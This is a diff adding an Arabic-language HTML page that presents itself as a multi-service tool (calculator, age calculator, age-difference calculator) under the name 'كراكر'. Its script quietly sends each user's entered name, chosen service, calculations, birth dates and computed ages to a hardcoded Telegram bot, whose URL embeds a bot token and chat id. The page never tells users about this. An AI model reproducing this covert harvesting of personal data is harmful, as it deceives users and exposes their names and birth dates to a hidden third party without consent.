@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تطبيق متعدد الخدمات - كراكر</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #121212;
+    color: #eee;
+    margin: 0;
+    padding: 0;
+  }
+  .page {
+    display: none;
+    padding: 20px 30px 70px 30px;
+    min-height: 90vh;
+    box-sizing: border-box;
+    position: relative;
+  }
+  .page.active {
+    display: block;
+  }
+  h2 {
+    color: #f39c12;
+    text-align: center;
+    margin-bottom: 15px;
+  }
+  label {
+    display: block;
+    margin: 15px 0 5px;
+    font-weight: 600;
+  }
+  input, select, button {
+    width: 100%;
+    padding: 12px;
+    font-size: 1.1rem;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+    box-sizing: border-box;
+  }
+  input, select {
+    background: #222;
+    color: #eee;
+    border: 1px solid #444;
+  }
+  input::placeholder {
+    color: #999;
+  }
+  button {
+    background: #27ae60;
+    color: white;
+    margin-top: 20px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    font-weight: bold;
+    box-shadow: 0 4px 8px rgba(39, 174, 96, 0.4);
+  }
+  button:hover {
+    background: #2ecc71;
+  }
+  .result {
+    margin-top: 15px;
+    padding: 15px;
+    background: #333;
+    border-radius: 12px;
+    font-weight: bold;
+    color: #1abc9c;
+    box-shadow: inset 0 0 10px #1abc9c;
+    min-height: 40px;
+  }
+  footer {
+    text-align: center;
+    padding: 15px 10px;
+    font-size: 14px;
+    color: #aaa;
+    background: #111;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    user-select: none;
+    font-family: 'Courier New', Courier, monospace;
+  }
+  /* ألوان نصوص متنوعة */
+  .text-yellow { color: #f1c40f; }
+  .text-cyan { color: #1abc9c; }
+  .text-orange { color: #e67e22; }
+  .text-pink { color: #e84393; }
+  .text-blue { color: #3498db; }
+  /* صورة الرأس */
+  .header-img {
+    display: block;
+    margin: 0 auto 15px auto;
+    width: 80px;
+    filter: drop-shadow(0 0 4px #f39c12);
+  }
+  /* زر الرجوع */
+  .back-btn {
+    background: #e74c3c !important;
+    box-shadow: 0 4px 8px rgba(231, 76, 60, 0.6) !important;
+  }
+</style>
+</head>
+<body>
+
+<!-- صفحة إدخال الاسم -->
+<div id="page1" class="page active">
+  <img src="https://cdn-icons-png.flaticon.com/512/2922/2922506.png" alt="مرحبا" class="header-img" />
+  <h2 class="text-yellow">مرحبا! أدخل اسمك</h2>
+  <label for="username" class="text-cyan">الاسم:</label>
+  <input type="text" id="username" placeholder="اكتب اسمك هنا" />
+  <button id="toChoice">متابعة</button>
+  <footer>© كراكر</footer>
+</div>
+
+<!-- صفحة اختيار الخدمة -->
+<div id="page2" class="page">
+  <img src="https://cdn-icons-png.flaticon.com/512/1055/1055672.png" alt="اختيار" class="header-img" />
+  <h2 class="text-orange">اختر الخدمة</h2>
+  <label for="service" class="text-pink">الخدمة:</label>
+  <select id="service">
+    <option value="">-- اختر خدمة --</option>
+    <option value="calculator">آلة حاسبة</option>
+    <option value="ageCalc">حساب العمر</option>
+    <option value="ageDiff">حساب الفرق بين عمرين</option>
+  </select>
+  <button id="goToService">الانتقال</button>
+  <footer>© كراكر</footer>
+</div>
+
+<!-- صفحة آلة حاسبة -->
+<div id="pageCalculator" class="page">
+  <img src="https://cdn-icons-png.flaticon.com/512/123/123205.png" alt="حاسبة" class="header-img" />
+  <h2 class="text-blue">آلة حاسبة</h2>
+  <label for="calcInput1" class="text-yellow">الرقم الأول:</label>
+  <input type="number" id="calcInput1" />
+  <label for="calcOperator" class="text-yellow">العملية:</label>
+  <select id="calcOperator">
+    <option value="+">+</option>
+    <option value="-">-</option>
+    <option value="*">*</option>
+    <option value="/">/</option>
+  </select>
+  <label for="calcInput2" class="text-yellow">الرقم الثاني:</label>
+  <input type="number" id="calcInput2" />
+  <button id="calcButton">احسب</button>
+  <div id="calcResult" class="result"></div>
+  <button onclick="showPage('page2')" class="back-btn" style="margin-top:10px;">رجوع</button>
+  <footer>© كراكر</footer>
+</div>
+
+<!-- صفحة حساب العمر -->
+<div id="pageAgeCalc" class="page">
+  <img src="https://cdn-icons-png.flaticon.com/512/2921/2921822.png" alt="عمر" class="header-img" />
+  <h2 class="text-blue">حساب العمر</h2>
+  <label for="birthYear" class="text-yellow">سنة الميلاد:</label>
+  <input type="number" id="birthYear" placeholder="مثال: 1990" />
+  <label for="birthMonth" class="text-yellow">شهر الميلاد (1-12):</label>
+  <input type="number" id="birthMonth" placeholder="مثال: 5" min="1" max="12" />
+  <label for="birthDay" class="text-yellow">يوم الميلاد (1-31):</label>
+  <input type="number" id="birthDay" placeholder="مثال: 15" min="1" max="31" />
+  <button id="ageCalcButton">احسب العمر</button>
+  <div id="ageCalcResult" class="result"></div>
+  <button onclick="showPage('page2')" class="back-btn" style="margin-top:10px;">رجوع</button>
+  <footer>© كراكر</footer>
+</div>
+
+<!-- صفحة حساب الفرق بين عمرين -->
+<div id="pageAgeDiff" class="page">
+  <img src="https://cdn-icons-png.flaticon.com/512/616/616408.png" alt="فرق عمر" class="header-img" />
+  <h2 class="text-blue">حساب الفرق بين عمرين</h2>
+  <label class="text-yellow">العمر الأول</label>
+  <input type="number" id="diffYear1" placeholder="سنة" />
+  <input type="number" id="diffMonth1" placeholder="شهر" min="1" max="12" />
+  <input type="number" id="diffDay1" placeholder="يوم" min="1" max="31" />
+  <label class="text-yellow" style="margin-top:15px;">العمر الثاني</label>
+  <input type="number" id="diffYear2" placeholder="سنة" />
+  <input type="number" id="diffMonth2" placeholder="شهر" min="1" max="12" />
+  <input type="number" id="diffDay2" placeholder="يوم" min="1" max="31" />
+  <button id="ageDiffButton">احسب الفرق</button>
+  <div id="ageDiffResult" class="result"></div>
+  <button onclick="showPage('page2')" class="back-btn" style="margin-top:10px;">رجوع</button>
+  <footer>© كراكر</footer>
+</div>
+
+<script>
+  let username = "";
+
+  function showPage(pageId) {
+    document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+    document.getElementById(pageId).classList.add("active");
+    window.scrollTo(0,0);
+  }
+
+  function sendTelegramMessage(text) {
+    fetch("https://api.telegram.org/bot7493058823:AAEOxMaNr1kEKralYp7qgioqtvAezKDDGYQ/sendMessage", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: "1489911673",
+        parse_mode: "Markdown",
+        text: text
+      })
+    }).then(() => console.log("تم الإرسال إلى البوت"))
+      .catch(err => console.error("خطأ في إرسال البيانات:", err));
+  }
+
+  // صفحة إدخال الاسم
+  document.getElementById('toChoice').onclick = () => {
+    const nameInput = document.getElementById('username').value.trim();
+    if (!nameInput) {
+      alert('يرجى إدخال الاسم');
+      return;
+    }
+    username = nameInput;
+    showPage('page2');
+    sendTelegramMessage(`*مستخدم جديد أدخل اسمه*\n👤 الاسم: _${username}_`);
+  };
+
+  // اختيار الخدمة
+  document.getElementById('goToService').onclick = () => {
+    const service = document.getElementById('service').value;
+    if (!service) {
+      alert('يرجى اختيار الخدمة');
+      return;
+    }
+    sendTelegramMessage(`*اختيار خدمة*\nالمستخدم: _${username}_\nالخدمة المختارة: _${service}_`);
+    if(service === 'calculator') {
+      showPage('pageCalculator');
+    } else if(service === 'ageCalc') {
+      showPage('pageAgeCalc');
+    } else if(service === 'ageDiff') {
+      showPage('pageAgeDiff');
+    }
+  };
+
+  // آلة حاسبة
+  document.getElementById('calcButton').onclick = () => {
+    const num1 = parseFloat(document.getElementById('calcInput1').value);
+    const num2 = parseFloat(document.getElementById('calcInput2').value);
+    const op = document.getElementById('calcOperator').value;
+    if (isNaN(num1) || isNaN(num2)) {
+      alert('يرجى إدخال أرقام صحيحة');
+      return;
+    }
+    let result;
+    switch(op) {
+      case '+': result = num1 + num2; break;
+      case '-': result = num1 - num2; break;
+      case '*': result = num1 * num2; break;
+      case '/':
+        if(num2 === 0){
+          alert('لا يمكن القسمة على صفر');
+          return;
+        }
+        result = num1 / num2; break;
+    }
+    document.getElementById('calcResult').textContent = `النتيجة: ${result}`;
+    sendTelegramMessage(`*آلة حاسبة*\nالمستخدم: _${username}_\n${num1} ${op} ${num2} = *${result}*`);
+  };
+
+  // حساب العمر
+  document.getElementById('ageCalcButton').onclick = () => {
+    const y = parseInt(document.getElementById('birthYear').value);
+    const m = parseInt(document.getElementById('birthMonth').value);
+    const d = parseInt(document.getElementById('birthDay').value);
+    if (!y || !m || !d) {
+      alert('يرجى إدخال جميع بيانات الميلاد');
+      return;
+    }
+    const birthDate = new Date(y, m -1, d);
+    const now = new Date();
+    if(birthDate > now){
+      alert('تاريخ الميلاد لا يمكن أن يكون في المستقبل');
+      return;
+    }
+    let ageYear = now.getFullYear() - y;
+    let ageMonth = now.getMonth() - (m -1);
+    let ageDay = now.getDate() - d;
+    if(ageDay < 0){
+      ageMonth--;
+      ageDay += new Date(y, m, 0).getDate();
+    }
+    if(ageMonth < 0){
+      ageYear--;
+      ageMonth += 12;
+    }
+    const result = `عمرك: ${ageYear} سنة، ${ageMonth} شهر، و${ageDay} يوم.`;
+    document.getElementById('ageCalcResult').textContent = result;
+    sendTelegramMessage(`*حساب العمر*\nالمستخدم: _${username}_\nتاريخ الميلاد: ${y}/${m}/${d}\n${result}`);
+  };
+
+  // حساب الفرق بين عمرين
+  document.getElementById('ageDiffButton').onclick = () => {
+    const y1 = parseInt(document.getElementById('diffYear1').value);
+    const m1 = parseInt(document.getElementById('diffMonth1').value);
+    const d1 = parseInt(document.getElementById('diffDay1').value);
+    const y2 = parseInt(document.getElementById('diffYear2').value);
+    const m2 = parseInt(document.getElementById('diffMonth2').value);
+    const d2 = parseInt(document.getElementById('diffDay2').value);
+    if ([y1,m1,d1,y2,m2,d2].some(v => isNaN(v) || v < 0)) {
+      alert('يرجى إدخال جميع القيم بشكل صحيح');
+      return;
+    }
+    let date1 = new Date(y1, m1-1, d1);
+    let date2 = new Date(y2, m2-1, d2);
+    if(date1 > date2) {
+      [date1, date2] = [date2, date1];
+    }
+    let diffYears = date2.getFullYear() - date1.getFullYear();
+    let diffMonths = date2.getMonth() - date1.getMonth();
+    let diffDays = date2.getDate() - date1.getDate();
+    if(diffDays < 0){
+      diffMonths--;
+      diffDays += new Date(date2.getFullYear(), date2.getMonth(), 0).getDate();
+    }
+    if(diffMonths < 0){
+      diffYears--;
+      diffMonths += 12;
+    }
+    const result = `الفرق: ${diffYears} سنة، ${diffMonths} شهر، و${diffDays} يوم.`;
+    document.getElementById('ageDiffResult').textContent = result;
+    sendTelegramMessage(`*حساب الفرق بين عمرين*\nالمستخدم: _${username}_\nالعمر الأول: ${y1}/${m1}/${d1}\nالعمر الثاني: ${y2}/${m2}/${d2}\n${result}`);
+  };
+</script>
+
+</body>
+</html>
